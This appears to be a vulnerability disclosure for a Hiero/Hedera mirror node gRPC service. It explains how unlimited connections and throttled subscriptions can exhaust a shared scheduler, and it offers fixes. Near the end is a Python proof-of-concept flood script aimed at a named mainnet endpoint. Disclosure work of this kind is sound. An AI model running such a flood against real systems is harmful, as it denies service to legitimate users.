### Title
Unbounded Concurrent gRPC Subscriptions Exhaust Shared `boundedElastic()` Scheduler, Starving Legitimate Topic Message Delivery

### Summary
`PollingTopicMessageRetriever` creates a single, process-wide `Schedulers.boundedElastic()` instance at construction time and uses it for every throttled subscription's repeat-polling and timeout scheduling. Because there is no global limit on the number of concurrent subscriptions (only a per-connection call cap of 5), an unprivileged attacker can open arbitrarily many TCP connections and saturate the shared scheduler's thread pool, causing legitimate subscribers' polling tasks to queue indefinitely and topic message gossip to be severely delayed or denied.

### Finding Description

**Exact code path:**

`PollingTopicMessageRetriever` constructs one shared scheduler at startup: [1](#0-0) 

Every call to `retrieve()` with `throttled=true` sets `numRepeats = Long.MAX_VALUE` in `PollingContext`: [2](#0-1) 

That same shared scheduler is then used for both the repeat delay and the inactivity timeout: [3](#0-2) 

`TopicMessageServiceImpl.subscribeTopic()` always calls the retriever with `throttled=true` for the initial historical phase, and also schedules a safety-check on the same `Schedulers.boundedElastic()`: [4](#0-3) 

**Root cause — failed assumption:** The design assumes that the per-connection call cap (`maxConcurrentCallsPerConnection = 5`) is sufficient to bound total scheduler load. It is not, because there is no limit on the number of TCP connections, no per-IP connection limit, and no global subscription counter that enforces a ceiling. [5](#0-4) [6](#0-5) 

The `subscriberCount` in `TopicMessageServiceImpl` is a **metric gauge only** — it enforces nothing: [7](#0-6) 

**Exploit flow:**

1. Attacker opens `N` TCP connections to port 5600 (no connection limit).
2. On each connection, attacker opens 5 concurrent `subscribeTopic` gRPC streams (the per-connection cap), targeting a topic with a `startTime` far in the past so historical messages keep flowing and `isComplete()` never returns `true` during the attack window.
3. Each stream triggers `retrieve(filter, true)` → `PollingContext.numRepeats = Long.MAX_VALUE`, scheduling a DB poll every 2 seconds on the shared `boundedElastic()` scheduler.
4. `Schedulers.boundedElastic()` defaults to `10 × CPU_cores` threads (e.g., 80 threads on an 8-core host). With `5N` concurrent subscriptions each submitting polling tasks, the thread pool saturates.
5. Legitimate subscribers' polling tasks queue behind attacker tasks; topic message gossip is delayed proportionally to queue depth, effectively starving delivery.

**Why `isComplete()` does not save you:** For throttled mode, `isComplete()` returns `true` only when the last page is smaller than `maxPageSize` (1000). On any topic with a continuous or large backlog of messages, each poll returns a full page, keeping `isComplete() == false` and the repeat loop alive indefinitely. [8](#0-7) 

**Why the 60-second timeout does not save you:** The `.timeout()` resets on every emitted message. As long as historical messages keep arriving (which they do when the topic has a large backlog), the timeout never fires. [9](#0-8) 

### Impact Explanation

- **Availability:** Legitimate subscribers experience severe delays or complete denial of topic message gossip delivery while the attack is sustained. The `boundedElastic()` task queue (100,000 tasks) absorbs overflow, so tasks are not dropped but are delayed by the full queue-drain time.
- **Secondary impact:** Each poll executes `topicMessageRepository.findByFilter()` against the database. Saturating the scheduler also saturates the DB connection pool, potentially cascading to other services sharing the same database.
- **Scope:** All subscribers on the affected node are impacted, not just those on the attacker's connections.

### Likelihood Explanation

- **No authentication required:** The gRPC endpoint is publicly accessible; no credentials are needed to open a subscription.
- **Low resource cost for attacker:** Opening TCP connections and gRPC streams is cheap. A single machine with a modest network connection can open thousands of connections.
- **Repeatable and sustained:** The attacker simply keeps connections open; no ongoing interaction is needed.
- **Realistic precondition:** Any public Hedera topic with historical messages (e.g., the HCS mirror topic itself) satisfies the `isComplete() == false` requirement.

### Recommendation

1. **Enforce a global concurrent-subscription limit** using an `AtomicLong` counter with a configurable ceiling (e.g., `hiero.mirror.grpc.retriever.maxConcurrentSubscriptions`). Reject new subscriptions with `RESOURCE_EXHAUSTED` when the limit is reached.
2. **Add a per-IP or per-client connection limit** at the Netty layer via `NettyServerBuilder.maxConnectionsPerIp()` or an equivalent interceptor.
3. **Use a dedicated, bounded scheduler per subscription** (or a separate fixed-size pool for retriever tasks) rather than the single shared `boundedElastic()` instance, so retriever saturation cannot affect other reactive pipelines.
4. **Apply a hard wall-clock timeout** on the total lifetime of a throttled retrieval session (independent of per-element timeout), so long-running historical retrievals are bounded regardless of message flow.
5. **Rate-limit subscription creation** per source IP using a token-bucket filter at the gRPC interceptor layer.

### Proof of Concept

```python
# Requires: grpcio, grpcio-tools, hedera proto stubs
import grpc, threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc as cs
from com.hedera.mirror.api.proto import consensus_service_pb2 as cs_pb2
from google.protobuf.timestamp_pb2 import Timestamp

TARGET = "mirror.mainnet.hedera.com:443"
TOPIC_ID = (0, 0, 1234)          # any topic with historical messages
START_EPOCH_SEC = 1_600_000_000  # far in the past → large backlog

def flood(conn_id):
    creds = grpc.ssl_channel_credentials()
    chan = grpc.secure_channel(TARGET, creds)
    stub = cs.ConsensusServiceStub(chan)
    req = cs_pb2.ConsensusTopicQuery(
        topicID=cs_pb2.TopicID(shardNum=TOPIC_ID[0],
                               realmNum=TOPIC_ID[1],
                               topicNum=TOPIC_ID[2]),
        consensusStartTime=Timestamp(seconds=START_EPOCH_SEC)
    )
    # Open 5 concurrent streams per connection (maxConcurrentCallsPerConnection)
    streams = [stub.subscribeTopic(req) for _ in range(5)]
    # Drain slowly to keep streams alive
    for s in streams:
        threading.Thread(target=lambda st=s: [_ for _ in st], daemon=True).start()

# Open N connections from multiple source IPs / threads
threads = [threading.Thread(target=flood, args=(i,)) for i in range(200)]
for t in threads: t.start()
for t in threads: t.join()

# Result: 200 connections × 5 streams = 1000 concurrent throttled retrievals
# → boundedElastic() thread pool saturated
# → legitimate subscriber polling tasks queue indefinitely
# → topic message gossip delivery stalled
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L34-42)
```java
    public PollingTopicMessageRetriever(
            ObservationRegistry observationRegistry,
            RetrieverProperties retrieverProperties,
            TopicMessageRepository topicMessageRepository) {
        this.observationRegistry = observationRegistry;
        this.retrieverProperties = retrieverProperties;
        this.topicMessageRepository = topicMessageRepository;
        scheduler = Schedulers.boundedElastic();
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L51-59)
```java
        return Flux.defer(() -> poll(context))
                .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
                        .jitter(0.1)
                        .withFixedDelay(context.getFrequency())
                        .withScheduler(scheduler))
                .name(METRIC)
                .tap(Micrometer.observation(observationRegistry))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))
                .timeout(retrieverProperties.getTimeout(), scheduler)
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L98-101)
```java
            if (throttled) {
                numRepeats = Long.MAX_VALUE;
                frequency = retrieverProperties.getPollingFrequency();
                maxPageSize = retrieverProperties.getMaxPageSize();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L121-128)
```java
        boolean isComplete() {
            boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();

            if (throttled) {
                return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
            }

            return limitHit;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-55)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L63-70)
```java
        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```
